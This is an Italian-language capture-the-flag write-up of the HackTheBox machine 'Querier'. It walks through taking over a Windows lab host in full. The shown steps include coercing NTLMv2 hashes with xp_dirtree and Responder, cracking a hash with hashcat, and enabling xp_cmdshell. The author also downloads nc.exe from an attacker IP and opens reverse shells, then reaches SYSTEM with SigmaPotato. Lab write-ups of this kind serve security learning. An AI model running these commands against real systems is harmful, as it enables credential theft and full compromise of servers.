---
title: caulk94 | HTB - Querier
layout: default
---
<div id="content-display">
    # Querier
    ```table-of-contents
    ```
    ## IP
    ```shell
    sudo sh -c "echo '10.129.59.155 querier' >> /etc/hosts"
    ```
    ## Port Scanning
    ```shell
    rustscan -a querier --ulimit 5000 -- -sVC -Pn -n

    Open 10.129.59.155:135
    Open 10.129.59.155:139
    Open 10.129.59.155:445
    Open 10.129.59.155:1433
    Open 10.129.59.155:5985
    ```

    ```shell
    [>] Running script "nmap -vvv -p {{port}} {{ip}} -sVC -Pn -n" on ip 10.129.59.155

    PORT      STATE SERVICE       REASON          VERSION
    135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds? syn-ack ttl 127
    1433/tcp  open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2017 14.00.1000.00; RTM
    | ms-sql-ntlm-info: 
    |   10.129.59.155:1433: 
    |     Target_Name: HTB
    |     NetBIOS_Domain_Name: HTB
    |     NetBIOS_Computer_Name: QUERIER
    |     DNS_Domain_Name: HTB.LOCAL
    |     DNS_Computer_Name: QUERIER.HTB.LOCAL
    |     DNS_Tree_Name: HTB.LOCAL
    |_    Product_Version: 10.0.17763
    |_ssl-date: 2025-11-22T13:59:23+00:00; 0s from scanner time.
    | ms-sql-info: 
    |   10.129.59.155:1433: 
    |     Version: 
    |       name: Microsoft SQL Server 2017 RTM
    |       number: 14.00.1000.00
    |       Product: Microsoft SQL Server 2017
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Issuer: commonName=SSL_Self_Signed_Fallback
    | Public Key type: rsa
    | Public Key bits: 2048
    | Signature Algorithm: sha256WithRSAEncryption
    | Not valid before: 2025-11-22T13:51:17
    | Not valid after:  2055-11-22T13:51:17
    | MD5:   0263:0c30:320f:82d4:162c:6169:6ebf:8448
    | SHA-1: ed29:92d5:2656:8cc1:5f51:a2f5:705b:158d:ce0d:24e7
    | -----BEGIN CERTIFICATE-----
    | MIIDADCCAeigAwIBAgIQH9SRONIxCahLqZt8xvhBYzANBgkqhkiG9w0BAQsFADA7
    | MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
    | bABsAGIAYQBjAGswIBcNMjUxMTIyMTM1MTE3WhgPMjA1NTExMjIxMzUxMTdaMDsx
    | OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
    | AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAKF0hF4H
    | v55Xy/buJUJJoF3osRNNPHZKEuBogPPJzF/1bImLrwdipD4iufMcZOwC671XbIJ0
    | foOoVZZV5acz/dmBofkuUlpjD+zva7Cp5H8R+Svl9neqhHWWu4q0H6XRTbxP3nSm
    | 0xwcBxVkBP9W2NXKUVroKKUc7+nc62uiVyfv2OkgUAU7JrFIAsVyBdFPFesZNmUp
    | 5GY7zfrYwKz9N7p3CdvN4jwonmrEM5a2n0ceg7j8H4DKdBqMC+zhQEmuZUnM+qwW
    | r5pa7BplYqD7fMFcZJx2kpa+QCtyjhYiBsKxekjkmk3ywgYD7PFYl662z4VeIzD/
    | 07HyZDfSu1TIUCUCAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAhFgeMrwNxk3i0Mdx
    | n+aWia7ZGnbfOE1NVXbGJM9/ijYC0ZktN808wW0tzAcOB0QgsnjlA2G45S8zrJWx
    | NHDJTx+Td1FuBLuMkTn+EBLt25z6AoxyFN/o+tk/zjW2zqzfIgYcduYyCszhkXHs
    | iyjOQXru8prKNrwexrpgjdzNmbzObYDbtriRu13nWgdDNNHGvB/yjUT0M0lQtvON
    | X/qPzi27TfDrf6ZIkin4Pnqg+RlLl5+n7Knlv9VCmDbEs54AiyctbFFkYLNSb3XQ
    | 8Ef8GU7BHPRecqsVqAe51M8Sk1eEd0ODrdtuX+WIFZDmHfTSQ44LrQXyM1p2WbHB
    | szipBQ==
    |_-----END CERTIFICATE-----
    5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | p2p-conficker: 
    |   Checking for Conficker.C or higher...
    |   Check 1 (port 46636/tcp): CLEAN (Couldn't connect)
    |   Check 2 (port 6046/tcp): CLEAN (Couldn't connect)
    |   Check 3 (port 55866/udp): CLEAN (Timeout)
    |   Check 4 (port 39842/udp): CLEAN (Failed to receive data)
    |_  0/4 checks are positive: Host is CLEAN or ports are blocked
    | smb2-time: 
    |   date: 2025-11-22T13:59:17
    |_  start_date: N/A
    |_clock-skew: mean: 0s, deviation: 0s, median: 0s
    | smb2-security-mode: 
    |   3:1:1: 
    |_    Message signing enabled but not required
    ```
    ## Exploiting
    ### 445 - SMB
    Proviamo ad enumerare le share con l'utente anonimo:
    ```shell
    smbclient -L querier -U anonymous%anonymous

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Reports         Disk      
    ```

    Proviamo a leggere la share `Reports`
    ```shell
    smbclient //querier/Reports -U anonymous%anonymous
    ```

    ```shell
    smb: \> ls
    .                                   D        0  Tue Jan 29 00:23:48 2019
    ..                                  D        0  Tue Jan 29 00:23:48 2019
    Currency Volume Report.xlsm         A    12229  Sun Jan 27 23:21:34 2019
    ```
    I file con estensione _XLSM_ sono un tipo di file di foglio di calcolo che supportano le macro. Possiamo vederlo come un file zip con dentro dei file.

    Scarico il file per ispezionarlo:
    ```shell
    smb: \> get "Currency Volume Report.xlsm"

    getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (60.3 KiloBytes/sec) (average 60.3 KiloBytes/sec)
    ```

    Verifico che tipo di file è
    ```shell
    file 'Currency Volume Report.xlsm'                       

    Currency Volume Report.xlsm: Microsoft Excel 2007+
    ```

    Provo a vedere se estraendo le stringhe dal file trovo qualcosa di interessante:
    ```shell
    strings Currency\ Volume\ Report.xlsm                  
    ```
    Non trovo nulla di utile.

    Dato che possiamo trattarlo con se fosse un archivio:
    ```shell
    unzip 'Currency Volume Report.xlsm' -d .
    cd xl
    strings vbaProject.bin
    ```

    ```txt
    macro to pull data for client volume reports
    n.Conn]
    Open 
    rver=<
    SELECT * FROM volume;
    word>
    MsgBox "connection successful"
    Set rs = conn.Execute("SELECT * @@version;")
    Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6
    further testing required
    Attribut
    e VB_Nam
    e = "Thi
    sWorkboo
    0{00020P819-
    $0046}
    |Global
    Spac
    dCreat
    Pred
    ecla
    BExpo
    Templ
    ateDeriv
    Bustomi
    acro to @pull d
    for clie
    nt volu
    reports
    further
    testing@ requi
    ub Conne
    ct()
    As A DODB.
    iohn
    ecordset
    Dr={SQ
    L Server
    =QUER
    IER;@Bste
    d_G#=no;D
    @;Uid
    <;Pwd=
    PcwTWTHR
    wryjc$c6
    !TimeouBt
    J= ad#B
    ' MsgBox
    J su
    ccessfulq@
    Exec
    SELECT *( @@
    b @Bt 
    OMD~E
    heet
    s(1).Ran
    ge("A1")
    @\pyFrom
    $rs.Cl
    nEnd IfE
    Attribut
    e VB_Nam
    e = "She@et1"
    t0{000
    20820-
    $0046
    |Global!
    Spac
    dCrea
    tabl
    Pre decla
    BExp
    Temp
    lateDeri
    Bustom
    Excel
    Win16
    Win32
    Win64x
    VBA6
    VBA7
    Project1
    stdole
    VBAProject
    Office
    ThisWorkbook|
    _Evaluate
    Sheet1
    Connect\
    Workbookk
    connu
    ADODBs
    Connection
    Recordset
    ConnectionString
    ConnectionTimeout
    State
    adStateOpen
    ExecuteY
    Sheets
    Range
    CopyFromRecordsetV
    Worksheet
    VBAProje
    stdole>
    *\G{00
    020430-
    6}#2.0#0
    #C:\Wind
    ows\Syst em32\
    tlb#OLE 
    Automati
    EOffDic
    2DF8D04C
    -5BFA-10
    1B-BDE5
    gram Fil
    es\Commo
    Micros
    oft Shar
    ed\OFFIC
    E16\MSO.0DLL#
    M 1@6.0 Ob
    Library
    ThisW
    orkbookG
    1Bxq
    Sheet1G
    S@#e@Xt
    ThisWorkbook
    Sheet1
    ID="{7819C482-CC73-4FB3-8245-31BB2E19C38A}"
    Document=ThisWorkbook/&H00000000
    Document=Sheet1/&H00000000
    HelpFile=""
    Name="VBAProject"
    HelpContextID="0"
    VersionCompatible32="393222000"
    CMG="191BC9EFCDEFCDEFCDEFCD"
    DPB="8D8F5D2BA59EA69EA69E"
    GC="0103D1D2D2D2D22D"
    [Host Extender Info]
    &H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000
    [Workspace]
    ThisWorkbook=26, 26, 1062, 609, C
    Sheet1=52, 52, 1088, 635, C
    ```
        Uid=reporting;Pwd=PcwTWTHRwryjc$c6

    Abbiamo un utente e una password.
    Proviamo ad usarli per accedere al servizio MS-SQL.
    ### 1443 - MS-SQL
    Vediamo la porta `1433` aperta con `ms-sql-s` esposto:

    Banner Grabbing::
    ```shell
    nmap -p 1433 -sV --script-args mssql.instance-all querier   

    Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-22 15:02 CET
    Nmap scan report for querier (10.129.59.155)
    Host is up (0.033s latency).

    PORT     STATE SERVICE  VERSION
    1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000
    ```

    Proviamo a loggarci:
    ```shell
    /usr/bin/impacket-mssqlclient reporting:'PcwTWTHRwryjc$c6'@querier -windows-auth

    SQL (QUERIER\reporting  reporting@volume)> 
    ```
    Ci siamo loggati!
    ## Privilege Escalation
    Controllo se ho i permessi di sysadmin:
    ```shell
    SQL (QUERIER\reporting  reporting@volume)> SELECT IS_SRVROLEMEMBER('sysadmin');
        
    -   
    0   
    ```

    Databases:
    ```shell
    SQL (QUERIER\reporting  reporting@volume)> SELECT name FROM master.sys.databases;
    name     
    ------   
    master   
    tempdb   
    model    
    msdb     
    volume   
    ```

    Tables's name:
    ```shell
    SELECT table_name,table_schema from volume.INFORMATION_SCHEMA.TABLES;

    # Empty
    ```

    List users
    ```shell
    SQL (QUERIER\reporting  reporting@volume)> SELECT sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
    login               login_type      password_hash   create_date   modify_date   status     
    -----------------   -------------   -------------   -----------   -----------   --------   
    QUERIER\reporting   WINDOWS_LOGIN            NULL   2019-01-29 00:10:07   2019-01-29 00:10:07   b'Enabled'   

    sa                  SQL_LOGIN                NULL   2003-04-08 09:10:35   2019-01-28 23:52:01   b'Disabled'  
    ```
    L'account sa è stato disattivato e il nostro account non ha i permessi di system admin.

    A questo punto potremmo pensare di essere bloccati ma arriva in nostro soccorso `xp_dirtree` che ci permette di navigare sul filesystem dell'host.
    ```shell
    SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree 'C:\Users', 1, 1;

    subdirectory    depth   file   
    -------------   -----   ----   
    Administrator       1      0   
    All Users           1      0   
    Default             1      0   
    Default User        1      0   
    mssql-svc           1      0   
    Public              1      0  
    ```
    Notiamo un nuovo utente! `mssql-svc`

    Se proviamo a enumerare le cartelle degli utenti non vediamo ne file ne cartelle.
    Possiamo sfruttare `xp_dirtree` in combinazione con `responder` per catturare l'NTLMv2 dell'utente che lancia i comandi!

    Avviamo responder:
    ```shell
    sudo responder -I tun0
    ```

    Navighiamo verso il nostro responder:
    ```shell
    SQL (QUERIER\reporting  reporting@volume)> EXEC xp_dirtree '\\10.10.14.130/fake', 1, 1;
    ```

    Riceviamo:
    ```shell
    [SMB] NTLMv2-SSP Client   : 10.129.59.155
    [SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
    [SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:f5b2c6fb9b1bbf2c:32046ABF89C12A2C128490F885BFD862:010100000000000080532B5BD55BDC01E0383B503F97A4000000000002000800450044005800430001001E00570049004E002D0031004D00420047004B004300550052004B004A005A0004003400570049004E002D0031004D00420047004B004300550052004B004A005A002E0045004400580043002E004C004F00430041004C000300140045004400580043002E004C004F00430041004C000500140045004400580043002E004C004F00430041004C000700080080532B5BD55BDC0106000400020000000800300030000000000000000000000000300000D7A8F7DDD876A3EABF41E6FDCF272BE280153FFF7828EC5D1503A381358ABF560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003000000000000000000000000000
    ```

    Crackiamo l'hash ntlmv2
    ```shell
    hashcat -m 5600 'mssql-svc::QUERIER:f5b2c6fb9b1bbf2c:32046ABF89C12A2C128490F885BFD862:010100000000000080532B5BD55BDC01E0383B503F97A4000000000002000800450044005800430001001E00570049004E002D0031004D00420047004B004300550052004B004A005A0004003400570049004E002D0031004D00420047004B004300550052004B004A005A002E0045004400580043002E004C004F00430041004C000300140045004400580043002E004C004F00430041004C000500140045004400580043002E004C004F00430041004C000700080080532B5BD55BDC0106000400020000000800300030000000000000000000000000300000D7A8F7DDD876A3EABF41E6FDCF272BE280153FFF7828EC5D1503A381358ABF560A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E00310033003000000000000000000000000000' /usr/share/wordlists/rockyou.txt --force
    ```

    ```shell
    MSSQL-SVC::QUERIER:f5b2c6fb9b1bbf2c:32046abf89c12a2c128490f885bfd862:010100000000000080532b5bd55bdc01e0383b503f97a4000000000002000800450044005800430001001e00570049004e002d0031004d00420047004b004300550052004b004a005a0004003400570049004e002d0031004d00420047004b004300550052004b004a005a002e0045004400580043002e004c004f00430041004c000300140045004400580043002e004c004f00430041004c000500140045004400580043002e004c004f00430041004c000700080080532b5bd55bdc0106000400020000000800300030000000000000000000000000300000d7a8f7ddd876a3eabf41e6fdcf272be280153fff7828ec5d1503a381358abf560a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00310033003000000000000000000000000000:corporate568
    ```
        corporate568

    Abbiamo la password per l'utente!
    `mssql-svc:corporate568`

    Proviamo a conneterci su mssql col nuovo utente:
    ```shell
    /usr/bin/impacket-mssqlclient 'mssql-svc':'corporate568'@querier -windows-auth
    ```
    Funziona!

    Controlliamo i permessi:
    ```
    SQL (QUERIER\mssql-svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
        
    -   
    1   
    ```
    Abbiamo i permessi di sysadmin! Possiamo lanciare comandi con `xp_cmdshell`!

    Abilitiamo `xp_cmdshell`:
    ```
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```

    Scarichiamo nc dal nostro browser:
    ```powershell
    EXEC xp_cmdshell 'powershell -c "mkdir C:\Temp"';
    EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.130/nc.exe -OutFile C:\Temp\nc.exe"';
    EXEC xp_cmdshell 'powershell -c "ls C:\Temp"';
    ```

    Apriamo un listhener:
    ```
    nc -lnvp 1234
    ```

    Avviamo la connessione:
    ```powershell
    EXEC xp_cmdshell 'powershell -c "C:\Temp\nc.exe 10.10.14.130 1234 -e powershell"';
    ```

    Otteniamo:
    ```powershell
    PS C:\Windows\system32> whoami

    whoami
    querier\mssql-svc
    ```

    Enumero i file sensibili:
    ```powershell
    PS C:\Windows\system32> Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

        Directory: C:\Users\mssql-svc\Desktop
    Mode                LastWriteTime         Length Name                                                                  
    ----                -------------         ------ ----                                                                  
    -ar---       11/22/2025   1:51 PM             34 user.txt    
    ```
    User flag.

    Controlliamo i privilegi dell'account:
    ```powershell
    PS C:\Windows\system32> whoami /priv

    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                               State   
    ============================= ========================================= ========
    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
    SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege       Create global objects                     Enabled 
    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
    ```
        SeImpersonatePrivilege

    Possiamo sfruttare SigmaPotato per elevare in nostro account ad admin o crearne uno nuovo.

    Avviamo un server da cui scaricheremo SigmaPotato:
    ```shell
    python3 -m http.server 80
    ```

    Scarichiamo e avviamo sigmaPotato:
    ```powershell
    cd C:\Temp; iwr http://10.10.14.130/SigmaPotato.exe -o C:\Temp\SigmaPotato.exe
    ```

    ```shell
    nc -lnvp 2345
    ```

    Usiamo nc per aprici un altra shell: con i privilegi di ntautority system
    ```powershell
    .\SigmaPotato "C:\Temp\nc.exe 10.10.14.130 2345 -e powershell"
    ```

    Otteniamo.
    ```powershell
    PS C:\Temp> whoami

    nt authority\system
    ```
    ## User flag
    ```shell
    type C:\Users\mssql-svc\Desktop\user.txt

    61cd************************b2b4
    ```

    ## Root flag
    ```shell
    type C:\Users\Administrator\Desktop\root.txt

    f333************************d245
    ```
</div>